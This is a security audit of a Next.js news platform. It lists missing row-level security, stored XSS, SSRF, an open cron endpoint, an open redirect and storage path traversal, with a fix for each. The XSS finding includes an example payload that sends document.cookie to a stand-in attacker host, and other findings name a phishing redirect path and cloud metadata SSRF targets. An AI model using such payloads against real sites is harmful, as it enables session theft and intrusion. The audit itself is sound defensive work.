# Production Readiness Audit

**Date:** 2026-07-11  
**Project:** WebTinTuc (Next.js 15 news platform)  
**Scope:** Full codebase — public site, admin panel, API routes, server layer, database schema, middleware, storage, analytics, and production config  
**Stack:** Next.js 15 App Router · React 19 · Supabase (Postgres + Auth) · Cloudflare R2 · Upstash Redis · TanStack Query · Zod  

**Related docs:** See also `docs/admin-panel-audit.md` for admin-UI-focused findings (some may already be fixed).

---

## Executive summary

The app has a solid layered architecture (API → actions → services → repositories), Zod validation on many inputs, cookie-based admin auth with role checks, and useful caching for public pages. **It is not production-safe yet** without addressing several high-impact security and data-integrity issues.

The most urgent risks:

| Area | Risk |
|------|------|
| **Database RLS** | Most tables have **no RLS**; with the public anon key this can mean direct PostgREST access to content and (worst case) writes |
| **Stored XSS** | Article body blocks and ad HTML are rendered with `dangerouslySetInnerHTML` with **no sanitization** |
| **Open SSRF** | Public `/api/image-proxy` fetches arbitrary URLs (private networks, cloud metadata, large responses) |
| **Cron auth** | `/api/cron/flush` is **unauthenticated when `CRON_SECRET` is unset** |
| **Cache invalidation** | Article mutations do not revalidate the public `articles` cache tag → stale public content |
| **Analytics races** | View/click flush uses non-atomic read-modify-write; counters can under/over-count under concurrency |

| Priority | Count | Themes |
|----------|------:|--------|
| **Critical** | 6 | RLS, XSS, SSRF, cron secret, open redirect, path traversal on storage keys |
| **High** | 10 | Auth/secrets, rate-limit fail-open, cache tags, analytics integrity, error leakage, missing security headers |
| **Medium** | 12 | Performance, config, incomplete features, operational gaps |
| **Low** | 8 | Polish, DX, edge cases |

**Recommendation:** Do not ship production traffic until Critical items (especially RLS + XSS + SSRF + cron) are fixed and secrets/env are verified on the host.

---

## Architecture snapshot

```
app/(site)/*          Public SSR pages
app/admin/*           Admin UI (session soft-gated in middleware)
app/api/*             Route handlers
server/actions        Auth + validation + revalidation
server/services       Business logic
server/repositories   Supabase (service role) / data access
middleware.ts         Admin gate + SEO redirects
```

**Data plane:** Almost all server data access uses `supabaseAdmin` (service role), which **bypasses RLS**. Public APIs intentionally go through the app server — but the browser also has the **anon key**, so PostgREST is a second attack surface if RLS/grants are wrong.

---

## Critical

### 1. Missing Row Level Security on core tables

**Where:** `current_schema.sql` (RLS section ~L581–616)

**What exists:** RLS is enabled only for:

- `redirects` (public SELECT)
- `page_stats_daily` (public SELECT)

**What is missing:** No RLS (and no explicit least-privilege grants in this schema dump) for:

- `articles`, `categories`, `ads`, `profiles`
- `article_stats_daily`, `ad_stats_daily`
- `site_settings`

**Impact (production):**  
With Supabase’s default grants, anyone holding `NEXT_PUBLIC_SUPABASE_ANON_KEY` (shipped to every browser) can often call PostgREST directly, e.g.:

- Read **draft** articles, soft-deleted rows, internal stats  
- If writes are open: insert/update/delete content, escalate `profiles.role`, inject ad HTML  

App APIs using the service role are **not** a substitute for database RLS.

**Fix:**

1. `ENABLE ROW LEVEL SECURITY` on every public table.  
2. Policies: anonymous/authenticated **SELECT** only for published, non-deleted public rows; **no** public INSERT/UPDATE/DELETE.  
3. Writes only via `service_role` (your server) or tightly scoped authenticated admin policies.  
4. `profiles`: users may read own row; only service role (or admin) updates `role`.  
5. Verify with: anon key + `curl` against REST for draft articles / profile update.

**Default role smell:** `profiles.role` defaults to `'admin'` (`current_schema.sql` L41). New profile rows must never become admin by accident — default should be `'editor'` or a non-privileged role, with admin granted explicitly.

---

### 2. Stored XSS via article content and ad HTML

**Where:**

- `app/(site)/posts/[id]/page.tsx` — `dangerouslySetInnerHTML` for string HTML and block `text`/`content`
- `components/AdBanner.tsx`, `components/MobileAdsStack.tsx` — `html_code` unsanitized
- Admin editor: `contenteditable` + `htmlToBlocks` (`PostEditorView.tsx`, `AdminUtils.ts`) preserves raw HTML
- Zod allows arbitrary strings in paragraph/list text and `html_code` (`article.schema.ts`, `ad.schema.ts`)

**Attack path:** Compromised admin account, malicious collaborator, or any future lower-privilege editor stores:

```html
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```

or a full HTML ad script. That runs for every public reader (session/cookie theft, defacement, malware drive-by).

**Also:** `block.type === "iframe"` renders `<iframe src={block.src}>` with **no allowlist** (arbitrary origins) and **no sandbox**.

**Fix:**

1. Sanitize on **write** and **read** (defense in depth) with a strict allowlist (e.g. DOMPurify + server-side sanitize).  
2. Strip event handlers, `javascript:` URLs, and dangerous tags (`script`, `object`, `embed`, etc.).  
3. Restrict ad HTML to a vetted subset or serve third-party ads only via approved providers / sandboxed iframes.  
4. Allowlist iframe hosts (YouTube, Vimeo, …) and set `sandbox` / CSP `frame-src`.  
5. Prefer CSP (`script-src 'self'`, limited `unsafe-inline`) so residual HTML injection is harder to exploit.

---

### 3. Public image proxy is an open SSRF / abuse endpoint

**Where:** `app/api/image-proxy/route.ts`

**Current controls:** Requires `http://` or `https://`; blocks same-origin loopback to the app origin; 10s timeout; 10MB after download; image content-type check.

**Gaps:**

| Gap | Impact |
|-----|--------|
| No blocklist for private IPs / link-local / metadata | SSRF to `169.254.169.254`, `10.x`, `127.0.0.1`, internal hostnames |
| DNS rebinding / redirect to internal host | Bypass naive host checks if only first URL is checked |
| `image/svg+xml` allowed | SVG can carry scripts when opened as document |
| No auth / no rate limit | Bandwidth and CPU abuse (proxy as free CDN/scraper) |
| Full body buffered in memory | Memory pressure under concurrent large downloads |
| Admin twin `app/api/admin/proxy-image/route.ts` | Same SSRF pattern (auth only; no private-IP block) |

**Fix:**

1. Resolve hostname; reject private/reserved ranges (and block redirects to them).  
2. Optional hostname allowlist (R2, Unsplash, known CDNs) — align with `lib/image-proxy.ts`.  
3. Disallow SVG or sanitize; never serve SVG with executable content.  
4. Rate-limit by IP; stream with size cap before full buffer.  
5. Prefer not exposing a general-purpose proxy at all if you control image hosts.

---

### 4. Cron flush endpoint can run without authentication

**Where:** `app/api/cron/flush/route.ts` L84–92

```ts
if (secret) {
  if (authHeader !== `Bearer ${secret}`) {
    throw new ApiError(401, ...)
  }
}
// if CRON_SECRET is missing → no check
```

**Impact:** Anyone who discovers the URL can:

- Trigger heavy Redis SCAN + Postgres writes  
- Race/corrupt analytics flush (delete Redis keys after partial writes)  
- Amplify cost on Upstash / Supabase  

`vercel.json.example` schedules `*/10 * * * *` but does not enforce secret presence.

**Fix:** Fail closed: if `CRON_SECRET` is missing in production, return 503 and do not run. Always require `Authorization: Bearer …`. Prefer Vercel Cron secret verification. Document required env in `.env.example`.

---

### 5. Open redirect via protocol-relative `to_path`

**Where:**

- `server/validations/redirect.schema.ts` — `to_path` must `startsWith('/')`  
- `middleware.ts` — `new URL(redirect.to_path, request.url)`

**Issue:** Strings like `//evil.example/phish` **start with `/`**, so they pass Zod.  
`new URL('//evil.example/phish', 'https://yoursite.com')` resolves to `https://evil.example/phish`.

An admin (or attacker with admin/API access) can create a redirect used for phishing off your domain.

**Fix:** Reject paths matching `//`, `/\`, encoding tricks; require `to_path` to be a single path (`/^\/(?!\/)[\w\-./?=&%]*$/` or stricter). Never allow scheme-relative URLs. Prefer relative redirect helpers that do not re-parse as absolute.

---

### 6. Storage key path traversal / unrestricted object keys

**Where:**

- `server/actions/storage.action.ts` — `folder` from FormData is unconstrained  
- `upload-url` / `download-url` / delete / move / copy — `key` is any string (length only)  
- `deleteFileFromR2`, `copyFileInR2`, `moveFileInR2` — no prefix allowlist

**Impact:** Authenticated admin (or stolen session / `ADMIN_API_SECRET`) can:

- Upload to arbitrary prefixes (`../`, absolute-looking keys)  
- Overwrite or delete any object in the bucket  
- Issue presigned PUT/GET for any key (1h expiry)

**Fix:**

1. Allowlist folders: `articles`, `ads`, `brand`, `media`, …  
2. Normalize keys: reject `..`, leading `/`, backslashes, null bytes.  
3. Force keys under a known prefix; never accept client-chosen absolute paths.  
4. Validate content-type and max size on upload.  
5. Prefer server-generated keys only (current multipart upload partially does this; presigned `key` does not).

---

## High

### 7. Rate limiting fails open and depends on optional Redis

**Where:** `server/rate-limit.ts`

- Missing Upstash env → `redisCommand` returns `null` → count becomes `0` → **allowed**  
- Exceptions → `{ allowed: true }`  
- Used by view / impression / click APIs  

**Impact:** Without Redis (or under Redis outage), analytics spam and cost amplification are unlimited. Even with Redis, spoofable `X-Forwarded-For` lets attackers rotate IPs unless the platform overwrites that header.

**Fix:** In production, require Redis for mutative public analytics or use a durable fallback (e.g. short in-memory + edge rate limit). Trust only the platform’s client IP. Consider fail-closed for abuse-sensitive routes if Redis is configured but errors.

---

### 8. Public cache tags not revalidated on article mutations

**Where:**

- Public caches: `lib/api/news.ts` tags `articles`, `categories`, `ads`, `settings`  
- Mutations: `server/actions/article.action.ts` only `revalidateTag('admin-articles')` + `dashboard` + `revalidatePath('/')` / `/admin/posts`

**Impact:** After publish/update/delete:

- Home feed, post detail, recommendations, category feeds can stay stale up to `revalidate: 60`  
- `revalidatePath('/')` does **not** reliably clear `unstable_cache` for `/posts/[slug]` or category routes  

Ads/categories actions revalidate `ads` / `categories`; **articles do not revalidate `articles`.**

**Fix:** On every article create/update/delete/restore:

```ts
revalidateTag('articles')
revalidatePath(`/posts/${slug}`)
// category path if category_id known
```

Same pattern for any future public-facing entities.

---

### 9. Analytics flush races and incomplete page-view pipeline

**Where:** `server/services/analytics.service.ts`, `app/api/cron/flush/route.ts`, `incrementArticleViews`

**Issues:**

1. **Read → add → upsert** on `article_stats_daily` / `ad_stats_daily` is not atomic; concurrent flushes lose increments.  
2. **Article `views`** uses the same non-atomic pattern.  
3. Cron **DELETEs Redis keys before Postgres succeeds** for ad stats (impressions deleted at L135 even if later upsert fails).  
4. **Page views:** flush looks for `page:views:YYYY-MM-DD` but **nothing in the codebase writes those keys** → dead code / incomplete feature.  
5. Page flush **upserts absolute `page_views` from Redis** (overwrite), not additive — wrong if ever partially reused.

**Fix:** Use SQL `INSERT … ON CONFLICT DO UPDATE SET views = table.views + EXCLUDED.views` (or RPC). Use Redis GETDEL / multi or Lua. Only delete Redis after successful write. Implement or remove page-view tracking consistently.

---

### 10. Internal errors returned to clients — FIXED

**Where:** `server/http.ts` `fail()`, `server/actions/action-result.ts`

**Status:** Fixed. Unknown errors are logged server-side (`console.error`) and clients receive only a generic message (`Internal Server Error` / `Lỗi hệ thống`). Specific messages remain for known `ApiError` and Zod validation errors.

---

### 11. Weak / incomplete security headers

**Where:** `next.config.ts` `headers()`

**Present:** HSTS (on some routes), DNS prefetch control, long cache for static assets.  

**Missing (recommended for production):**

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy` | Mitigate XSS / third-party script |
| `X-Content-Type-Options: nosniff` | MIME sniffing |
| `X-Frame-Options` / `frame-ancestors` | Clickjacking |
| `Referrer-Policy` | Limit referrer leakage |
| `Permissions-Policy` | Camera/mic/geolocation off |
| `Cross-Origin-Opener-Policy` | Isolate browsing context |

Admin and API routes are largely outside the HSTS matcher pattern (`/((?!api|admin|_next).*)`) — confirm TLS/HSTS is applied at the edge (Vercel) for all hosts.

---

### 12. `ADMIN_API_SECRET` is full admin equivalent

**Where:** `server/auth.ts`

Matching `x-admin-secret` returns `{ id: 'admin-api-secret', role: 'admin' }` with **no rotation, no scope, no audit identity**.

**Impact:** Single shared secret = full CMS + storage + account management. Leak in logs, client, or CI = total compromise.

**Fix:** Prefer short-lived service tokens, scoped roles (cron vs full admin), rotation policy. Never send this header from browser code (currently admin client uses cookies — good). Ensure secret is long random and only on server/cron.

---

### 13. Build ignores TypeScript errors

**Where:** `next.config.ts`

```ts
typescript: { ignoreBuildErrors: true }
```

**Impact:** Production builds can ship type-broken code. Runtime failures appear only under load or rare paths.

**Fix:** Set `ignoreBuildErrors: false` (or enforce `pnpm typecheck` in CI as a required gate). Fix all type errors before release.

---

### 14. Test 500 route left in the app

**Where:** `app/(site)/test-500/page.tsx`

**Impact:** Public URL that throws on every visit → noise in error tracking, possible SEO garbage, intentional client crash for visitors who find it.

**Fix:** Delete for production or gate behind `NODE_ENV === 'development'`.

---

### 15. No upload size / MIME enforcement on server

**Where:** `uploadFileToR2` / storage action

Client may filter images; server accepts any `File` with client-provided `ContentType`, no max size.

**Impact:** Storage cost bombs, malicious content types, very large body processing on serverless.

**Fix:** Max size (e.g. 5–10MB), allowlist MIME + magic-byte check, virus scanning optional for high trust.

---

### 16. Password policy too weak; no login rate limit in app

**Where:** `admin-account.schema.ts` — min password length **6**; login via Supabase password with no app-level throttle

**Impact:** Brute force / credential stuffing on `/admin` (Supabase may have some protections; do not rely solely on them). Weak passwords for privileged users.

**Fix:** Min 12+ chars, complexity or breach check; enable Supabase rate limits / CAPTCHA / MFA for admins; lockout after N failures.

---

## Medium

### 17. Middleware redirect cache is per-instance only

**Where:** `middleware.ts` in-memory `Map`; coordination via `lib/redirect-cache.ts`

**Impact:** On serverless multi-instance, the local Map is not shared; after redirect updates, some edges can serve old rules until invalidation or TTL.

**Status:** Mitigated / documented (2026-07-11).

- **Documented** in `middleware.ts` and `lib/redirect-cache.ts` (per-isolate Map; not for security routing).
- **Shorter TTL:** `REDIRECT_CACHE_TTL_MS` = **60s** (was 5 minutes) so max blind staleness without Redis is one minute.
- **Explicit purge (optional Redis):** create/update/delete redirect actions call `bumpRedirectCacheVersion()` (`INCR redirects:cache:version`). Middleware polls every `REDIRECT_VERSION_CHECK_MS` (10s) and clears the local Map when the generation changes. Without Upstash env vars, behavior falls back to TTL only.

**Ops expectation:** With Redis configured, expect ≤ ~10s lag after admin edits; without Redis, wait up to 60s. Acceptable for SEO redirects.

---

### 18. Sitemap hard-capped at 1000 articles

**Where:** `app/sitemap.ts` — `listPublicArticles({ limit: 1000 })`

**Impact:** Sites with more published posts omit older URLs from sitemap → SEO coverage gap.

**Fix:** Paginate all published articles or emit sitemap index + chunks.

---

### 19. Admin list search injects raw strings into PostgREST filters

**Where:** repositories using  
`.or(\`title.ilike.%${options.search}%\`)` etc.

**Impact:** Not classic SQL injection (PostgREST parameterized), but special characters (`,`, `.`, `*`) can break filters or broaden queries unexpectedly (filter injection).

**Fix:** Escape `%`, `_`, commas, and PostgREST reserved characters; or use `textSearch` / RPC with bound params only.

---

### 20. Homepage / category data over-fetch relative to UI

**Where:** `getHomeFeed` loads featured + 12 latest; category feed `limit: 50` while UI shows fewer

**Impact:** Extra DB/network and payload size on TTFB. Minor today; grows with content richness (if content columns ever join incorrectly).

**Fix:** Select only columns needed for cards; page size match UI.

---

### 21. `listPublicAds` returns full rows including `html_code`

**Where:** `ad.repository.ts` `.select('*')`

**Impact:** Larger payloads; HTML ads delivered to every page that loads ads array even if unused for a position.

**Fix:** Select needed columns; split HTML ads if rare.

---

### 22. Environment documentation incomplete for production

**Where:** `.env.example` only documents mocks, API base, `ADMIN_API_SECRET`

**Missing from example (used in code):**

- `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`  
- `SUPABASE_SERVICE_ROLE_KEY`  
- `CRON_SECRET`  
- `UPSTASH_REDIS_REST_URL`, `UPSTASH_REDIS_REST_TOKEN`  
- R2: `R2_ACCOUNT_ID`, `R2_ACCESS_KEY_ID`, `R2_SECRET_ACCESS_KEY`, `R2_BUCKET_NAME`, `R2_PUBLIC_URL`  
- `NEXT_PUBLIC_SITE_URL` (defaults to `https://example.com` — **breaks SEO/canonical/OG** if unset)

**Fix:** Complete `.env.example` with comments; fail startup if required secrets missing in production.

---

### 23. Default `NEXT_PUBLIC_SITE_URL` is example.com

**Where:** layouts, sitemap, robots, post metadata

**Impact:** Wrong canonicals, Open Graph URLs, JSON-LD, and sitemap host in production if env forgotten.

**Fix:** Require `NEXT_PUBLIC_SITE_URL` at build/runtime for production builds.

---

### 24. No automated test script in package.json / CI unknown

**Where:** `package.json` scripts — no `test` script; Vitest exists under `tests/`

**Impact:** Easy to ship regressions; many server tests exist but may not run in deploy pipeline.

**Fix:** Add `"test": "vitest run"` and gate PRs/deploys on tests + typecheck + build.

---

### 25. Soft-delete restore UX / media folder UX

**Where:** Documented in `docs/admin-panel-audit.md` (restore UI, nested folders, logout cache). Some media upload paths appear improved (cover/ad R2 upload present in current code); re-verify before treating as closed.

**Impact:** Operational mistakes (cannot restore; wrong folder prefix) → content loss perception and support load.

---

### 26. Account delete has no last-admin guard

**Where:** `admin-account.repository.ts` `deleteAdminAccount`

**Impact:** Last admin can be deleted → permanent lockout (recovery only via Supabase dashboard / service role).

**Fix:** Refuse delete if it would remove the last `role = admin` profile; prevent self-delete without confirmation + another admin.

---

### 27. `editor` role unused / inconsistent

**Schema allows `editor`; app mostly requires `role === 'admin'`.**  
Creating non-admin users yields login “no permission” and middleware bounce to login.

**Impact:** Confusing product model; accidental editor accounts unusable.

**Fix:** Implement editor permissions or remove role from schema/UI until ready.

---

### 28. JSON-LD via `dangerouslySetInnerHTML`

**Where:** layouts / post page `JSON.stringify` into script tags

**Impact:** Lower risk if data is trusted; if titles/descriptions ever include `</script>`, breakout is possible.

**Fix:** Replace `<` with `\u003c` in serialized JSON (common Next pattern) or use a JSON-LD component that escapes.

---

## Low

### 29. Verbose client console logging

Offline detector / view tracker / search errors log to browser console — fine for dev; reduce noise in production.

### 30. `profiles` SELECT for admin check from browser

Client reads `profiles` with anon key — requires at least SELECT policy for own row once RLS is on. Plan policies carefully so role checks still work.

### 31. Featured home query + latest may duplicate work

Featured is separate query; could use one query with ordering — micro-optimization.

### 32. Rate limit window is fixed EXPIRE on first INCR

Classic sliding-window approximation; if `EXPIRE` fails after first `INCR`, key can stick without TTL (rare). Use SET NX EX or Lua.

### 33. Public `okCached` TTL 60s vs edge CDN

Good default; document purge story for breaking news.

### 34. `ignoreDuplicates` / upsert options on page_stats

Dead incomplete path; remove or finish.

### 35. Large `offlineImage.ts` base64 blob

Inflates client bundle for offline UI — consider external asset.

### 36. Admin session module cache 5 minutes

Soft UI only; APIs re-check — acceptable; ensure logout clears React Query (see admin audit).

---

## Performance notes (production load)

| Topic | Assessment |
|-------|------------|
| Public page caching | Good: `unstable_cache` 60s + tag design (fix article tag invalidation) |
| Dashboard | Good: SQL RPCs for aggregates (`get_dashboard_all_timeframes`, range helpers) |
| Image optimization | Next/Image + remotePatterns for R2/Unsplash; external URLs go through proxy (costly) |
| Middleware | Extra Supabase + profile query on every `/admin/*` request; redirect REST call on public paths |
| Analytics | Fire-and-forget POSTs — good UX; Redis buffer — good if Redis always on |
| Sitemap / lists | Cap at 1000; admin search may fetch all matching accounts when searching |
| Serverless cold start | Service role client + S3 client module init — normal; avoid huge imports on public routes |

**Hotspots to watch after launch:** image-proxy traffic, uncached search API (`ok` not `okCached`), middleware redirect lookups without Redis, recursive media list on large buckets (pagination added — still expensive).

---

## Security checklist (pre-production)

- [ ] RLS enabled + policies reviewed on **all** tables; verified with anon key  
- [ ] Service role key **never** exposed to client or git  
- [ ] `CRON_SECRET`, `ADMIN_API_SECRET`, R2, Upstash set and strong  
- [ ] `NEXT_PUBLIC_SITE_URL` = real production origin  
- [ ] HTML/ad sanitization + CSP deployed  
- [ ] Image proxy locked down or removed  
- [ ] Redirect validation rejects `//`  
- [ ] Storage keys allowlisted  
- [ ] Typecheck fails the build; tests run in CI  
- [ ] `/test-500` removed  
- [ ] Security headers at app or CDN  
- [ ] Admin MFA / strong passwords  
- [ ] Backups + point-in-time recovery on Supabase  
- [ ] R2 bucket not world-writable; public read only for intended prefixes  
- [ ] Monitoring: 5xx, cron success, Redis errors, auth failures  

---

## What is already in good shape

- Layered server architecture with Zod on many admin payloads  
- Admin API routes consistently call `requireAdmin`  
- Middleware soft-gates `/admin` and checks `profiles.role === 'admin'` (not session-only)  
- Public article list filters `status = published` and `deleted_at IS NULL` in app code  
- Soft deletes for content entities  
- Redis-buffered view/ad events with rate limits **when Redis is configured**  
- Redirect schema restricts status codes; path-based redirects for slug changes  
- FTS trigger on articles (`search_vector`)  
- Dashboard SQL RPCs reduce heavy JS aggregation  
- Admin storage GET uses `private, no-store`  
- Cover/ad image flows appear to upload to R2 (not raw base64) in current admin UI — keep regression tests  

---

## Suggested fix order

1. **RLS + grants audit** (blocks catastrophic data exposure)  
2. **XSS sanitization + iframe allowlist + CSP**  
3. **SSRF lock-down / remove open image proxy**  
4. **Cron fail-closed secret**  
5. **Redirect + storage key validation**  
6. **`revalidateTag('articles')` + path revalidation**  
7. **Atomic analytics flush**  
8. **Generic 500 messages; security headers; env completeness**  
9. **Remove test-500; enable typecheck in build; CI tests**  
10. Admin UX items from `admin-panel-audit.md`  

---

## Appendix A — High-risk file index

| File | Concern |
|------|---------|
| `current_schema.sql` | Incomplete RLS; default admin role |
| `app/api/image-proxy/route.ts` | SSRF / abuse |
| `app/api/admin/proxy-image/route.ts` | SSRF (auth only) |
| `app/api/cron/flush/route.ts` | Optional auth; non-atomic flush |
| `app/(site)/posts/[id]/page.tsx` | XSS via content/iframe |
| `components/AdBanner.tsx` | XSS via `html_code` |
| `components/MobileAdsStack.tsx` | XSS via `html_code` |
| `middleware.ts` | Open redirect with `//` paths |
| `server/auth.ts` | Shared admin secret superuser |
| `server/rate-limit.ts` | Fail-open |
| `server/actions/article.action.ts` | Missing `articles` tag revalidation |
| `server/services/analytics.service.ts` | Race on counters |
| `server/services/storage.service.ts` | Unscoped keys |
| `app/api/admin/storage/upload-url/route.ts` | Arbitrary presigned keys |
| `server/http.ts` | Error message leakage |
| `next.config.ts` | ignoreBuildErrors; thin headers |
| `app/(site)/test-500/page.tsx` | Prod footgun |

---

## Appendix B — Severity definitions

| Level | Meaning |
|-------|---------|
| **Critical** | Likely remote exploit, data breach, or total integrity failure in production |
| **High** | Significant security, correctness, or availability risk under realistic conditions |
| **Medium** | Degraded SEO, ops, performance, or security defense-in-depth |
| **Low** | Polish, minor edge cases, future hardening |

---

*End of report. Re-audit after Critical/High items are closed, and re-verify against the live Supabase project (RLS and grants can differ from `current_schema.sql`).*
